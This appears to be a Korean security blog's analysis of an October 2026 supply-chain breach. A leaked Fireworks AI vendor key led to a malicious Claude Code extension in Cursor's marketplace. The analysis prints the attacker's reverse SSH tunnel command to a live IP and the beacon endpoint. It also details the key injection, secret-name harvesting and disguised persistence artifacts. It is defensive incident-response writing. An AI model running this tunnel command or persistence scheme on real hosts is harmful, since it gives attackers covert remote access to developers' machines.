[침해 분석] Cursor × Fireworks 공급망 침해 — 추론 벤더 키 하나가 악성 Claude Code 확장 배포 권한까지 넘었다

추론 벤더 키 하나가 읽기 전용 버킷의 미마스킹 자격증명을 거쳐, 마켓플레이스 캐시에 악성 Claude Code 빌드를 써넣는 권한까지 도달했다. 11시간 노출 창, 최대 5,000명의 개발자.

김도현 #공급망공격#Cursor#FireworksAI#ClaudeCode#리버스SSH#LLMJacking

2026년 10월 29일 오전 2시 27분(PT)부터 오후 1시 35분까지, 약 11시간 동안 Cursor의 VS Code 확장 마켓플레이스에서 Anthropic.claude-code 확장의 2.1.312와 2.1.313 빌드가 정상 배포본과 구분되지 않는 형태로 내려받아졌다. Anthropic이 만든 확장이 아니었고, Anthropic 제품의 취약점도 아니었다. Cursor가 11월 13일 공개한 사고 보고서는 그 악성 빌드가 어디서 왔는지를 처음으로 끝까지 설명한다 — 추론·학습 벤더인 Fireworks AI에 Cursor가 발급했던 액세스 키 하나에서 출발해, 데이터 공유용 읽기 전용 버킷, 내부 SaaS 도구들, 그리고 마지막에 확장을 게시할 수 있는 권한까지 이어지는 다섯 단계 사슬이다.

이 사건이 단순한 데이터 유출과 다른 이유는 침해의 끝이 데이터가 아니라 배포 경로였다는 점이다. 개발자의 노트북에 확장으로 들어간 코드는 사용자 몫의 소프트웨어가 아니라 공급자의 신뢰 그 자체를 실행한다. Cursor는 최대 5,000명이 악성 빌드를 받았을 수 있다고 추정했고, 코드 오류와 관리자 권한 요구 때문에 대부분의 호스트에서 SSH 터널 자체는 열리지 않았다고 밝혔다. 그러나 터널이 실패해도 공격자 공개키는 authorized_keys에 남았고, 지속성 스크립트는 확장 디렉터리 바깥에 심겼다. 확장을 삭제하는 것으로 끝나지 않는 침해다.

같은 달 Fireworks AI는 두 건의 침해를 연달아 공개했다. 10월 6일 내부 자격증명 오용으로 일부 고객 계정의 평가 작업 환경변수(API 키·토큰)가 노출됐고, 10월 23일에는 R&D 머신을 호스팅하던 서드파티 클라우드가 뚫리면서 개발 머신 접근과 추가 고객 데이터(청구 정보, 일부 고객의 시크릿·데이터셋·미완성 모델 가중치) 영향이 확인됐다. Unit 42가 포렌식에 투입됐고, Fireworks는 금전 동기의 범죄 조직이 훔친 LLM 접근 권한을 불법 라우팅 게이트웨이에 파는 LLMJacking과 연관됐다고 밝혔다. Wiz는 이번 달 AI 개발 플랫폼을 겨냥한 연쇄 침해(Railway의 부정 AI 과금 약 74만 달러, Northflank, Lightning AI, OpenCode, Warp)를 "Black October"이라 명명했다. Cursor 사슬은 그 연쇄의 하류에 있는 한 갈래지만, 피해의 형태는 가장 나쁜 쪽이다 — 돈이 아니라 개발자 워크스테이션의 원격 접근이다.

1. 다섯 단계 사슬: '읽기 전용' 키가 배포 권한이 되기까지

Cursor 보고서가 밝힌 경로는 각 단계가 다음 단계의 열쇠를 넘겨주는 구조다. 어느 한 지점에서 자격증명이 범위를 넘지 못했다면 사슬은 끊겼다.

[1] Fireworks에 발급한 Cursor 액세스 키가 Fireworks 쪽에서 노출
        │  (키 소유 = Cursor의 공유 데이터 접근 권한)
        ▼
[2] 읽기 전용 공유 스토리지 버킷 전체 복사
     └ 2025년 위주 코딩 에이전트 트레이스 (Privacy Mode 미사용, 학습 허용분)
     └ 일부 트레이스에 마스킹되지 않은 자격증명  ← 사슬의 실제 결절
        │  (트레이스에 섞여 있던 제3자 SaaS 자격증명)
        ▼
[3] Cursor 내부 SaaS 도구 접근
     └ 아카이브된 비프로덕션 소스 저장소(사업 연락처 일부)
     └ 고객지원 데이터·이메일 대화, 사용 지표·연락처
     └ 일부 코딩 에이전트 대화 요약
     └ 고객이 지원팀에 보낸 자격증명
        │  (내부 시스템에서 꺼낸 '확장 배포용' 자격증명)
        ▼
[4] 마켓플레이스 캐시에 악성 VSIX 직접 게시 (2026-10-29 02:27~13:35 PT)
        │  (최대 5,000명이 특정 캐시 버전 요청)
        ▼
[5] 개발자 호스트에서 로더 실행 → SSH 키·지속성·리버스 터널

노출 규모는 Cursor 기준으로 트레이스가 전체 사용자의 0.05% 미만, API 자격증명이 0.01% 미만이다. 비율만 보면 작다. 그러나 이 사건에서 그 비율은 피해의 크기를 말해주지 않는다. 트레이스에 섞인 자격증명은 "어느 고객이 몇 명"의 문제가 아니라 어느 시스템에 접근할 수 있는 키였는가의 문제였고, 그중 하나가 마켓플레이스 배포 경로를 열었다. 데이터 유출 사고의 심각도는 유출된 사용자 수가 아니라, 유출된 자격증명이 다음에 무엇을 할 수 있는지로 결정된다.

[4]단계의 표현을 그대로 읽으면 중요한 사실이 하나 드러난다. 공격자는 확장을 "게시"한 것이 아니라 마켓플레이스 제공에 쓰이는 캐시에 직접 사본을 놓았다. Cursor가 공개한 문장만으로 판단하면, 그 경로에서 실질적인 배포 승인 경계는 아티팩트 서명 검증이 아니라 그 캐시에 쓸 수 있는 자격증명의 보유 여부였다. 패키지 이름 Anthropic.claude-code는 게시자 네임스페이스를 사칭했고, 사용자 입장에서 그 이름은 신뢰의 전부다. Open VSX 원본에는 악성코드가 없었고 Anthropic 시스템도 침해되지 않았다 — 즉 이 침해는 "확장 생태계"의 문제가 아니라 한 공급자의 서빙 캐시 무결성 문제였다.

2. 근본 원인: 자격증명이 흐르는 경로를 자산으로 세지 않았다

이 사슬에는 메모리 손상도, 경쟁 조건도, 인증 우회 취약점도 없다. 있는 것은 세 개의 설계 판단이고, 각각이 다음 단계의 권한을 넓혔다.

첫째, 데이터 평면에 평문 자격증명이 흘렀다. 모델 학습용으로 공유하는 트레이스는 본질적으로 프롬프트·도구 호출·터미널 출력의 기록이다. 개발자가 에이전트에게 붙여넣는 값에는 API 키와 토큰이 포함되고, 마스킹이 한 번 새면 그 값은 "학습 데이터"라는 이름으로 저장소에 남는다. Cursor의 사후 조치 목록에 모든 코드 저장소에 시크릿 스캐닝 추가가 있는데, 이번에 뚫린 지점은 코드 저장소가 아니라 트레이스와 지원 티켓이었다. 시크릿 스캐닝을 코드에만 걸어두면 데이터 평면은 그대로 사각지대로 남는다.

둘째, 벤더 키의 권한 범위가 데이터 범위와 같았다. Cursor가 Fireworks에 발급한 키는 "함께 학습하기 위해 공유한 데이터" 전체를 읽을 수 있었다. 문제는 그 버킷이 읽기 전용이었다는 사실이 안전장치로 읽힌다는 착각이다. 읽기 전용은 변조를 막지만 열람은 막지 않는다. 공유 데이터 버킷의 위협 모델은 "상대가 데이터를 바꾸는가"가 아니라 "상대 자격증명이 탈취되면 무엇이 복사되는가"다. 여기에 더해 Fireworks 쪽에서 그 키가 어떻게 보관됐는지는 두 회사의 공개 문서 어디에도 특정되지 않았다. Fireworks는 10월 6일 사고에서 평가 작업 환경변수에 시크릿이 들어 있었다고 밝혔고, Cursor는 "키가 Fireworks에 의해 노출됐다"고만 적었다. 어느 사고에서 어느 키가 노출됐는지 연결하는 문장은 양쪽 모두에 없다 — 공급망 사고의 귀속이 늘 그렇듯, 경계 양쪽이 각자의 문장만 남긴다.

셋째, 발행 권한이 내부 시스템 자격증명에 얹혀 있었다. Cursor의 표현은 "내부 시스템에서 유출된 데이터에 있던 자격증명을 사용해" 악성 사본을 캐시에 놓았다는 것이다. 즉 확장 배포라는 공급자 신뢰의 최상위 동작이, 데이터 평면과 같은 자격증명 저장소에서 꺼낼 수 있는 자격증명으로 수행됐다. 정상적인 분리는 이렇게 생겨야 한다.

데이터 평면 (학습·지원·분석)         발행 평면 (마켓플레이스)
  └ 벤더 공유 키, 읽기 전용            └ 게시 권한, 서명 키
  └ 트레이스·티켓·지표 저장소          └ VSIX 캐시, 게시자 레지스트리
  └ 유출 시: 데이터 열람               └ 유출 시: 임의 코드 배포
        └────────── 자격증명 저장소 공유 금지 ──────────┘

이 두 평면이 같은 자격증명 저장소를 쓰는 순간, 트레이스 한 줄에 섞인 키가 임의 코드 배포로 승격된다. Cursor가 사후에 "모든 노출 자격증명 회전"과 "서비스 제공자 전반의 네트워크 접근 제한 확대"를 넣은 것은 이 승격 경로를 끊는 조치로 읽힌다. 다만 구조적으로 더 강한 해법은 자격증명 회전이 아니라 발행 권한을 사람이 승인하는 별도 경로로 분리하고, 게시자 서명을 서빙 시점에 검증하는 것이다.

3. 익스플로잇 체인: 모듈 로드 한 줄에서 리버스 SSH 터널까지

악성 VSIX의 변조 지점은 extension.js다. Microsoft 위협 인텔리전스가 복원한 로더는 확장의 정상 초기화 이전에 실행되는 함수로, Node.js API만으로 정보 수집·파일 수정·OS 명령 실행을 수행한다. 별도 바이너리를 내려받지 않고 내장 도구만 쓰며, 명령 출력을 억제하고 오류를 조용히 삼킨다. 확장은 로드 후에도 정상 동작하기 때문에 사용자는 이상을 느끼지 못한다.

수집 항목은 호스트명, 사용자명, OS, 아키텍처, 홈 디렉터리, 작업 디렉터리, Git 설정 이메일, 그리고 환경변수 이름 중 KEY, TOKEN, SECRET, PASS, AWS, GCP가 들어간 최대 40개다. 값이 아니라 이름만 보낸다는 점이 흥미롭다. 이는 즉시 탈취가 아니라 어떤 종류의 시크릿이 이 호스트에 있는지의 목록을 만드는 정찰이다. 공인 IP는 ifconfig.me와 api.ipify.org 같은 정상 서비스로 조회하고, 결과는 hxxp://134[.]209[.]82[.]225:8099/beacon으로 POST된다.

SSH 단계는 역할이 다른 두 개의 신원을 쓴다. 하나는 피해자 계정에 대한 접근을 허가하는 공개키(svc-telemetry 주석, 지문 SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk)이고, 다른 하나는 터널 서버로 나가는 연결을 인증하는 개인키다. 로더는 authorized_keys에 svc-telemetry 표식이 없을 때만 키를 덧붙이고, 개인키는 호스트명과 홈 경로에서 파생한 10자리 16진수를 붙인 .stk_<10 hex> 임시 파일로 떨어뜨린 뒤 ssh -i로 넘긴다.

터널 명령줄은 목적이 그대로 드러난다.

ssh -N -R '*:0:localhost:22' \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ServerAliveInterval=30 -o ServerAliveCountMax=3 \
    -o ExitOnForwardFailure=yes -o IdentitiesOnly=yes \
    -i <홈경로 해시>.stk_<10 hex> tunnel@134.209.82.225

-R '*:0:localhost:22'는 원격 서버에 포트를 하나 할당받아, 그 포트로 들어온 연결을 피해자 루프백의 22번으로 넘기라는 뜻이다. 호스트 키 검증을 끄고(StrictHostKeyChecking=no), known_hosts를 /dev/null로 우회하며, 대화형 프롬프트를 없애 자동 재연결이 가능하게 했다. 유닉스 계열에서는 autossh -M 0을 우선 시도하고 없으면 ssh로 떨어지며, Windows에서는 숨김 PowerShell 루프를 쓴다. 루프는 SSH가 죽고 60초 뒤 다시 붙는다.

지속성은 플랫폼별로 정상 모니터링 컴포넌트를 사칭한다.

플랫폼시작 지점주요 아티팩트
macOS사용자 LaunchAgent (RunAtLoad, KeepAlive)~/Library/LaunchAgents/com.apple.sysmond.plist, ~/.config/.smt, ~/.config/.smtk
Linux사용자 crontab @reboot~/.config/.smt, ~/.config/.smtk, /tmp/.stk_<10 hex>
WindowsSysMon 예약 작업 (SYSTEM 실행 시도)%USERPROFILE%\.config\smt.cmd, %USERPROFILE%\.config\smtk, %TEMP%\.stk_<10 hex>
Windows 대체시작 프로그램 폴더 배치 파일%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\sysmon.cmd

이름이 SysMon, com.apple.sysmond인 것은 의도적이다. 관리자가 프로세스 목록에서 봤을 때 시스템 모니터링으로 보이게 만든 위장이고, Microsoft는 같은 이유로 "이름만으로 악성 여부를 판단하지 말고 각 시작 개체의 실행 내용을 확인하라"고 권고한다.

성공과 실패를 구분해서 읽어야 한다. 역방향 터널이 열리려면 피해자 호스트의 SSH 서비스가 켜져 있어야 하고(systemsetup -setremotelogin on, Add-WindowsCapability ... OpenSSH.Server 시도), 그건 관리자 권한을 요구한다. Cursor는 코드 자체의 오류와 권한 요구 때문에 대부분의 macOS·Windows 호스트에서 이 단계가 실패했다고 밝혔다. 하지만 실패한 것은 터널이지 침해가 아니다. 공격자 공개키는 이미 authorized_keys에 들어갔고, 지속성 스크립트는 확장 디렉터리 밖에 남았고, 호스트 정보는 전송됐다. 서버가 내려간 지금도 그 키와 스크립트는 로컬에 그대로 있을 수 있다.

4. 제거와 재설계: 호스트에서 확인할 것, 플랫폼이 분리해야 할 것

호스트 점검. 가장 빠른 판별은 authorized_keys의 표식이다. macOS·Linux는 grep -qs svc-telemetry ~/.ssh/authorized_keys, Windows는 %USERPROFILE%\.ssh\authorized_keys와 C:\ProgramData\ssh\administrators_authorized_keys를 함께 본다. 키가 없더라도 확장 설치 기록, .stk_ 파일, 시작 개체를 별도로 확인해야 한다. Microsoft는 이름이 같은 정상 모니터링 소프트웨어가 있을 수 있으므로 시작 개체의 실행 내용을 확인하고, 키를 지울 때도 지문을 대조해 정확히 그 항목만 제거하면서 정상 SSH 키와 원격 개발 설정을 보존하라고 권고한다.

제거 순서. 확장 삭제가 첫 단계가 되면 안 된다. 증거 보존 → 호스트 격리 → 공격자 키·터널 프로세스·지속성 개체·확장 제거 → 신뢰할 수 있는 다른 시스템에서 자격증명 회전과 세션 폐기 → 재구축 여부 판단 순이다. 노출 창 동안 그 호스트에 있던 토큰·쿠키·SSH 키는 "이름만 수집됐다"는 이유로 안전하다고 볼 수 없다. 터널이 열리지 않았더라도 로컬 코드 실행은 성립했고, 그 코드는 임의 명령을 실행할 능력을 가졌다. Cursor의 조사 스크립트와 제거 스크립트는 공지에 첨부돼 있으니 실행 전에 내용을 확인하고, 실행 후에도 나열된 아티팩트가 남지 않았는지 다시 검증해야 한다.

플랫폼 운영자에게 남는 설계 과제. 이 사슬은 네 가지 분리로 끊긴다.

첫째, 데이터 평면의 시크릿을 유입 시점에 걸러야 한다. 코드 저장소 스캐닝은 이미 하던 일이고 이번에 뚫린 곳이 아니다. 에이전트 트레이스, 지원 티켓, 로그 아카이브처럼 "데이터"로 분류된 저장소에 같은 스캐너를 걸고, 마스킹 실패를 파이프라인 실패로 처리해야 한다.

둘째, 벤더 키는 데이터셋·작업 단위로 쪼개고 수명을 짧게 가져가야 한다. 하나의 읽기 전용 키가 공유 버킷 전체를 읽는 구조는 편리하지만, 그 편리함이 곧 단일 실패점이다. 가능하면 버킷 단위·접두사 단위 권한, 짧은 TTL, 발급자 네트워크 대역 제한을 함께 건다. Fireworks가 사후에 "불필요한 상향 권한 제거"와 "네트워크 경로 제한"을 넣은 것이 같은 방향이다.

셋째, 발행 권한은 데이터 자격증명과 다른 저장소에 두고, 서빙 시점에 게시자 신원을 검증해야 한다. 캐시에 쓸 수 있는 자격증명 하나가 게시자 네임스페이스 사칭으로 이어지지 않으려면, 아티팩트가 실제 게시자의 서명을 갖고 있는지 내려주는 순간 확인해야 한다. 서명 없이 이름만 맞으면 통과하는 구조는 마켓플레이스가 아니라 파일 서버다.

넷째, 개발자 워크스테이션의 이그레스를 기본 차단으로 둬야 한다. 이 악성코드의 C2는 아웃바운드 22번 역터널이다. 업무 단말에서 임의 프로세스가 외부 22번으로 나가는 것을 허용하는 조직은, 지속성 개체를 다 지워도 같은 채널을 다시 열 수 있다. autossh, ssh -R 조합에 대한 프로세스 탐지와 함께, 확장 설치 쿨다운과 게시자 허용 목록(Cursor의 하드닝 가이드가 제공하는 통제)을 켜두면 패키지가 올라온 직후의 창을 줄일 수 있다.

이번 사건의 교훈은 "AI 도구를 조심하자"로 요약되지 않는다. Cursor가 사후에 재배포한 것은 프로덕션 인프라 전체였고, 회전한 것은 발견된 모든 자격증명이었다. 그 정도의 조치가 필요했던 이유는 침해의 시작이 코드 결함이 아니라 신뢰 경계를 그은 방식이었기 때문이다. 공급망은 계약서가 아니라 자격증명 그래프다. 어느 키가 어느 데이터를 읽고, 그 데이터가 어느 키를 품고 있고, 그 키가 어느 평면에 쓸 수 있는지 — 이 질문에 답하지 못하는 조직은 자기 마켓플레이스가 아니라 남의 버킷에서 시작된 사슬의 다섯 번째 단계에 서 있게 된다.
